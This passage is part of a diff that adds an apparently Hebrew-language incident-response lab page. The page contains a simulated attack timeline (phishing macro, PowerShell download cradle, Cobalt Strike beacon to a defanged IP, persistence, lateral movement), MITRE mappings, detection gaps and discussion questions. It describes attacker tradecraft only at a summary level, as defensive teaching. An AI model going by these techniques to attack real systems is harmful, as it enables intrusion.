+        <tr><td><strong>MTTC (Mean Time to Contain)</strong></td><td>Containment - Detection</td><td><strong>30 דקות</strong></td></tr>
+        <tr><td><strong>Dwell Time</strong></td><td>Containment - Initial Access</td><td><strong>1 שעה ו-45 דקות</strong></td></tr>
+        <tr><td><strong>Lateral Movement Window</strong></td><td>Time between lateral movement and containment</td><td><strong>1 שעה ו-15 דקות</strong></td></tr>
+      </table>
+
+      <div class="note">Dwell Time של 1:45 הוא סביר אך ה-MTTD של 1:15 יכול להשתפר עם detection rules מתאימים. ה-Lateral Movement קרה 45 דקות לפני ה-containment — פער חשוב!</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 11</div>
+      <strong>כתיבת סיכום ציר הזמן לדוח</strong>
+      <pre>================================================================
+ATTACK TIMELINE SUMMARY — INC-2026-0099
+Machine: WS-SALES-07 | User: sales.user
+Analyst: [YOUR NAME] | Date: 2026-05-18
+================================================================
+
+09:10 (est)  Phishing email received (T1566.001)
+09:12        User opened malicious Word document (T1204.002)
+09:14:30     Macro executed PowerShell download cradle (T1059.001)
+09:15        Malware (Cobalt Strike) dropped to Temp (T1105)
+09:15:05     C2 beacon to 185.220.101[.]42:443 (T1071.001)
+09:15:30     Persistence: Registry Run key added (T1547.001)
+09:18:32     Persistence: Local account svc_update created (T1136.001)
+09:18:35     svc_update added to Administrators (T1098)
+09:20:00     Persistence: Service installed (T1543.003)
+09:45:12     LATERAL MOVEMENT to SRV-FILES-02 (T1021.002)
+10:30        DETECTION — user reports unusual behavior
+11:00        CONTAINMENT — machine isolated, accounts disabled
+
+Kill Chain stages covered: 5/7 (Delivery through Actions)
+MITRE techniques: 13 across 8 tactics
+IOCs identified: 10
+MTTD: 1h 15m | MTTC: 30m | Dwell Time: 1h 45m
+
+DETECTION GAPS:
+- Phishing email not blocked (no .docm filter)
+- Macro execution not prevented (no GP restriction)
+- C2 IP not in IOC feeds
+- Lateral movement not detected by any tool
+
+RECOMMENDATIONS:
+[P1] Block macro-enabled files at email gateway
+[P1] Restrict PowerShell execution policy
+[P2] Deploy EDR with behavioral detection
+[P2] Implement network segmentation
+[P3] Add C2 beacon detection rules to SIEM
+================================================================</pre>
+    </li>
+
+  </ol>
+</div>
+
+<div class="section">
+  <h2>תוצאה צפויה</h2>
+  <ul class="prereq">
+    <li>ציר זמן מלא עם 12+ אירועים מניתוח ידני של ראיות</li>
+    <li>10 IOCs מזוהים ומתועדים (defanged)</li>
+    <li>כל אירוע ממופה ל-Kill Chain stage ול-MITRE ATT&CK technique</li>
+    <li>13 MITRE ATT&CK techniques ב-8 tactics זוהו</li>
+    <li>MTTD, MTTR, ו-Dwell Time מחושבים</li>
+    <li>Detection Gaps מזוהים עם המלצות לשיפור</li>
+    <li>סיכום מוכן להכנסה לדוח IR</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>שאלות לסיכום</h2>
+  <div class="question-box">
+    <h4>שאלות למחשבה ודיון</h4>
+    <ol>
+      <li>מה ההבדל בין Cyber Kill Chain ל-MITRE ATT&CK? מתי נעדיף כל אחד?</li>
+      <li>באיזה שלב של ה-Kill Chain הכי קל לעצור את ההתקפה? הסבר.</li>
+      <li>למה חלק מהזמנים בציר הזמן הם "משוער"? איך ניתן לשפר את הדיוק?</li>
+      <li>אם לא היה לנו PowerShell Script Block Logging — איזו ראיה היינו מפסידים?</li>
+      <li>הסבר למה Lateral Movement קרה <strong>אחרי</strong> ה-Detection אך <strong>לפני</strong> ה-Containment. מה הלקח?</li>
+      <li>איך הידע שמדובר ב-Cobalt Strike (מ-VirusTotal) משפיע על התגובה שלך?</li>
+      <li>כתוב 3 כללי SIEM (Detection Rules) שיזהו את ההתקפה הזו בשלב מוקדם יותר.</li>
+      <li>השווה בין ציר הזמן שבנית ידנית לציר שהיית בונה ב-Sentinel (Azure Lab). מה היתרונות והחסרונות?</li>
+    </ol>
+  </div>
+</div>
+
+<div class="section">
+  <h2>סיכום</h2>
+  <p>בניית ציר זמן ידנית מלמדת אותך להבין כל ראיה ומה היא אומרת. גם כשיש כלים אוטומטיים,
+  היכולת לנתח Event Logs, קבצי process, ו-network artifacts ידנית — ולחבר אותם לסיפור מלא —
+  היא מיומנות יסודית. מיפוי ל-Kill Chain נותן את ה"סיפור" של ההתקפה, ומיפוי ל-MITRE ATT&CK
+  נותן את הדיוק הטכני. שניהם יחד = ציר זמן מקצועי שמספר בדיוק מה קרה, מתי, ואיך.</p>
+</div>
+
+</div>
+<footer>&copy; כל הזכויות שמורות | CyberLabs</footer>
+</body>
+</html>
